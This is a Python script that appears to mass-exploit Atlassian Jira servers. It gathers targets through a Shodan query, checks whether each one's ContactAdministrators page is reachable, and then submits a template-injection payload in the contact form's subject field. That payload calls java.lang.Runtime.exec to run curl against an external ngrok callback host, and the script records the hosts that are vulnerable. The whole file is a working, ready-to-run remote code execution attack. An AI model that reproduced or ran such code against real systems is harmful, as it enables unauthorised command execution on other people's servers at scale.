import json
import requests
import os
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

QUERY = 'http.component:"atlassian jira"'
OUTPUT_FILENAME = "jira_output"
OUTPUT_FILENAME_DOWNLOADED = OUTPUT_FILENAME + ".json.gz"
DECOMPRESSED_FILENAME = OUTPUT_FILENAME + ".json"
SCANNED_HOSTS_FILENAME = "scanned_hosts.txt"

jira_hosts = []

def recover_scanned_hosts():
    try:
        with open(SCANNED_HOSTS_FILENAME, 'r') as host:
            for h in host:
                jira_hosts.append(h.rstrip("\n"))
    except Exception as e:
        print(e)

def download_data_from_Shodan(query):
    result = os.system("shodan download --limit 1 {} \'{}\'".format(OUTPUT_FILENAME_DOWNLOADED, query))
    if(result != 0):
        return False
    return True

def decompress_data(filename):
    result = os.system('gzip -d {}'.format(filename))
    if(result != 0):
        return False
    return True

def load_results(filename):
    results = []
    
    try:
        with open(filename, 'r') as host:
            for h in host:
                extracted_host = extract_host(json.loads(h))
                formated_host = format_host(extracted_host)
                results.append(formated_host)
    except Exception as e:
        print(e)

    return results

def prepare_data():
    data = ""
    if(download_data_from_Shodan(QUERY)):
        if(decompress_data(OUTPUT_FILENAME_DOWNLOADED)):
            data = load_results(DECOMPRESSED_FILENAME)
        else:
            print('Error on Decompress')
    else:
        print('Error on Download Results')
    
    return data

def extract_host(data):
    hosts = {}

    hosts['ip_str'] = data['ip_str']

    if(type(data['data']) == list):
   
        for i in range(len(data['data'])):
           hosts['ports'] = data['data'][i]['port']
   
    else:
        hosts['ports'] = data['port']
    
    return hosts


def format_host(hosts):
    host = ""

    if(hosts['ports'] != 443):
        host += "http://" + hosts['ip_str'] + ":" + str(hosts['ports'])
    else:
        host += "https://" + hosts['ip_str'] + ":" + str(hosts['ports'])

    return host

def extract_hostname(response_body):
    hostname = ""

    try:
        REGEX_HOSTNAME = 'class="aui-header-logo aui-header-logo-custom"><a href="'

        t = re.search(REGEX_HOSTNAME, response_body)

        span = t.span()

        hostname = response_body[span[1]:].split("\"")[0]
    
    except Exception as e:
        print("Erro: {}".format(e))

    return hostname

def verify_ContactAdministrators_page(host):
    url = ""
    
    if(host[-1] == "/"):
        url = host + "ContactAdministrators!default.jspa"
    else:
        url = host + "/../ContactAdministrators!default.jspa"
    
    try:
        request = requests.get(url, verify=False, allow_redirects=True, timeout=5)
        if('name="subject"' in request.text):
            return True

        else:
            return False

    except Exception as e:
        print("Error: {}".format(e))


def save(text):
    os.system('echo "Host: {} | Domain: {}" >> vulnerables_output.txt'.format(text[0], text[1]))

def verify_jira(host):
    if(host in jira_hosts):
        return 

    else:
        try:
            os.system('echo "{}" >> scanned_hosts.txt'.format(host))
            print(host)
            request = requests.get(host, verify=False, allow_redirects=True, timeout=5)
            jira_hosts.append(host)

            if('name="atlassian-token"' in request.text):
                
                if(verify_ContactAdministrators_page(request.url)):
                    hostname = extract_hostname(request.text)
                    print("Host: {} have the Contact Page Habilited | Domain: {}".format(host, hostname))
                    exploit(request.url, request.text)
                    save((host, hostname))
                    
                print("Not Vulnerable")

        except Exception as e:
            print("Error: {}".format(e))

def exploit(host, response_body):
    print("[+] Exploiting [+]")
    atlassian_meta = re.search('name="atlassian-token" content="', response_body)
    span = atlassian_meta.span()

    atl_token = response_body[span[1]:].split("\"")[0]

    url = ""
    
    if(host[-1] == "/"):
        url = host + "ContactAdministrators.jspa"
    else:
        url = host + "/../ContactAdministrators.jspa"

    web_server = "https://fa624381.ngrok.io/" + host
    
    cookies = {
        'atlassian.xsrf.token': atl_token,
        'JSESSIONID': '3EF8DCD599A0A001F80EDDC08B31AE18',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

    data = {
        'from': 'rapt00rr.me@protonmail.com',
        'subject': '$i18n.getClass().forName(\'java.lang.Runtime\').getMethod(\'getRuntime\',null).invoke(null,null).exec(\'curl {}\').waitFor()'.format(web_server),
        'details': 'test',
        'atl_token': atl_token,
        'Send': 'Send'
    }

    requests.post(url, headers=headers, cookies=cookies, data=data, verify=False, allow_redirects=True, timeout=7)
    print("[+] Exploited Successful, check your logs [+]")

def main():
    hosts = prepare_data()
    for host in hosts:
        verify_jira(host)

main()